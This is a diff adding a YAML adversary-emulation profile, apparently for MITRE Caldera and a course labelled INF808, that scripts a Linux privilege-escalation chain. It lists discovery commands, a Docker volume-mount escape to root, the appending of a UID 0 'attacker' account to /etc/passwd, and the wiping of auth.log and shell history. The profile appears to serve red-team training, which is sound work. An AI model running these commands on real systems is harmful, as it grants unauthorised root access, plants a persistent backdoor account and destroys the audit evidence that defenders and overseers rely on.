@@ -1,0 +1,129 @@
+id: 0fb6bd04-3bae-48cf-a68d-854f2ef7bf29
+name: INF808 - Privilege Elevation Operator (PEO)
+description: Adversaire spécialisé dans l'obtention d'un accès initial à travers l'exploitation de vulnérabilités d'applications accessibles publiquement (T1190), suivi d'une escalade de privilèges pour obtenir un contrôle root complet sur les systèmes Linux (Ubuntu 20.04). Ce profil simule un attaquant capable de contourner les mécanismes de défense, d'abuser des configurations sudo et des failles d'applications web. Les techniques mises en œuvre suivent les tactiques d'accès initial (TA0001) et d'escalade de privilèges (TA0004) définies par le framework MITRE ATT&CK.
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- c0da588f-79f0-4263-8998-7496b1a40596
+- 5c4dd985-89e3-4590-9b57-71fed66ff4e2
+- c1cd6388-3ced-48c7-a511-0434c6ba8f48
+- 85d81b9e-b3f6-4a43-96c5-f0be373be964
+- 69603e49-9f25-400e-8a78-8c5de4077c2d
+- f7d70e2d-63b1-42e5-a6b9-5fed13d1911f
+- e5e15b86-6d61-4ccc-bed9-02270ba207b2
+- fc5efaa4-a4f1-4868-87fa-df5525667974
+- 4178f794-982e-476f-a5d5-7644291048cf
+abilities:
+ c0da588f-79f0-4263-8998-7496b1a40596:
+  name:  Identify active user
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       whoami
+   - sh:
+     platform: linux
+     command: |
+       whoami
+   - psh:
+     platform: windows
+     command: |
+       $env:username
+   - cmd:
+     platform: windows
+     command: |
+       echo %username%
+ 5c4dd985-89e3-4590-9b57-71fed66ff4e2:
+  name:  Permission Groups Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Local Groups"
+  technique_id:  T1069.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       gpresult /R
+   - sh:
+     platform: darwin
+     command: |
+       groups
+   - sh:
+     platform: linux
+     command: |
+       groups
+ c1cd6388-3ced-48c7-a511-0434c6ba8f48:
+  name:  Find local users
+  tactic:  discovery
+  technique_name:  "Account Discovery: Local Account"
+  technique_id:  T1087.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'
+   - sh:
+     platform: linux
+     command: |
+       cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'
+ 85d81b9e-b3f6-4a43-96c5-f0be373be964:
+  name:  INF808 - Discovery: List Docker Containers
+  tactic:  discovery
+  technique_name:  "Discover Docker Containers"
+  technique_id:  T1610.1
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       docker ps -a
+ 69603e49-9f25-400e-8a78-8c5de4077c2d:
+  name:  INF808 - Decouverte des logiciels installes
+  tactic:  discovery
+  technique_name:  "Software Discovery"
+  technique_id:  T1518
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       find / -name "docker.sock" 2>/dev/null
+ f7d70e2d-63b1-42e5-a6b9-5fed13d1911f:
+  name:  INF808 - Access Check: Docker Group Check
+  tactic:  privilege-escalation
+  technique_name:  "Exploit Docker"
+  technique_id:  T1611
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       id
+ e5e15b86-6d61-4ccc-bed9-02270ba207b2:
+  name:  INF808 - Docker Privilege Escalation
+  tactic:  privilege-escalation
+  technique_name:  "Exploit Docker for Root Access"
+  technique_id:  T1611
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       docker run -v /:/mnt alpine sh -c 'chroot /mnt whoami'
+ fc5efaa4-a4f1-4868-87fa-df5525667974:
+  name:  INF808 - Persistence: Create Root User
+  tactic:  persistence
+  technique_name:  "Abuse Elevation Control"
+  technique_id:  T1548.002
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo 'attacker:x:0:0:attacker:/root:/bin/bash' >> /etc/passwd
+ 4178f794-982e-476f-a5d5-7644291048cf:
+  name:  INF808 - Cleanup: Clear Logs and History
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal"
+  technique_id:  T1070
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       echo "" > /var/log/auth.log && echo "" > ~/.bash_history
